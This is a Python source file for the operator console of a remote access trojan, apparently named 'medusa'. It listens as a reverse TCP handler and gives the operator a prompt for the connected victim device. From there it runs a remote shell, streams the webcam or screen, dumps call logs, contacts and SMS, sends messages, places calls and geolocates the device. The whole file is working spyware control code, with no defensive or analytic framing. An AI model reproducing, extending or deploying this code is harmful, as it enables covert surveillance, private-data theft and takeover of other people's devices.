import socket
import threading
import time
from flask import Flask, Response, request
from colorama import Fore, Style, init
import cv2
import numpy as np
from pynput import keyboard

init(autoreset=True)

app = Flask(__name__)
server_thread = None
stop_server_flag = threading.Event()
ctrl_pressed = False  

def on_press(key):
    global ctrl_pressed
    try:
        if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            ctrl_pressed = True  
        elif key.char == 'p' and ctrl_pressed:  
            print(Fore.RED + "[ * ] CTRL+P detected! Stopping server...")
            stop_server()
            return False  
    except AttributeError:
        pass

def on_release(key):
    global ctrl_pressed
    if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
        ctrl_pressed = False  

def listen_for_ctrl_p():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def start_streaming(client_socket, mode):
    print(Fore.BLUE + "[ * ] Starting...")
    time.sleep(1)
    print(Fore.BLUE + "[ * ] Preparing player...")
    time.sleep(1)

    @app.route('/video_feed')
    def video_feed():
        return Response(generate_frames(client_socket),
                        mimetype='multipart/x-mixed-replace; boundary=frame')

    def run_server():
        app.run(host='0.0.0.0', port=5000, use_reloader=False)

    global server_thread
    server_thread = threading.Thread(target=run_server)
    server_thread.start()

    print(Fore.BLUE + f"Opening player at: http://localhost:5000")
    print(Fore.BLUE + "[ * ] Streaming...")

def generate_frames(client_socket):
    while True:
        data = client_socket.recv(921600)
        if not data:
            break
        frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

def handle_client(client_socket, addr):
    target_ip, target_port = addr
    print(Fore.GREEN + f"[ * ] Metercrack session 1 opened (0.0.0.0:9999 -> {target_ip}:{target_port})")

    while True:
        try:
            command = input(Fore.MAGENTA + "medusa > ")
        except EOFError:
            break

        if command == "sniffer_start":
            print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")

        if command == "CTRL+P":  
            print(Fore.RED + "[ * ] Server will be stopped after CTRL+P")
            continue

        if command == "shell":
            print(Fore.YELLOW + "[ * ] Entering interactive shell mode. Type 'exit' to leave.")
            while True:
                shell_command = input(Fore.CYAN + "shell > ")
                if shell_command.lower() == "exit":
                    print(Fore.YELLOW + "[ * ] Exiting shell mode.")
                    break
                client_socket.send(shell_command.encode('utf-8'))
                output = client_socket.recv(4096).decode('utf-8')
                print(Fore.WHITE + output)
            continue

        if command.startswith("webcam_stream") or command.startswith("screen_stream"):
            mode = command.split('_')[0]
            start_streaming(client_socket, mode)
            continue

        if command.startswith("dump_calllog"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("dump_contacts"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("dump_sms"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue
        
        if command.startswith("send_sms"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("geolocate"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        if command.startswith("call"):
            client_socket.send(command.encode('utf-8'))
            output = client_socket.recv(4096).decode('utf-8')
            print(Fore.WHITE + output)
            continue

        client_socket.send(command.encode('utf-8'))

def stop_server():
    stop_server_flag.set()
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    print(Fore.GREEN + "[ * ] Started reverse TCP handler on 0.0.0.0:9999")
    print(Fore.GREEN + "[ * ] Listening for incoming connections...")

    keyboard_thread = threading.Thread(target=listen_for_ctrl_p)
    keyboard_thread.start()

    while True:
        client_socket, addr = server_socket.accept()
        print(Fore.GREEN + f"[ * ] Connection established from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    main()
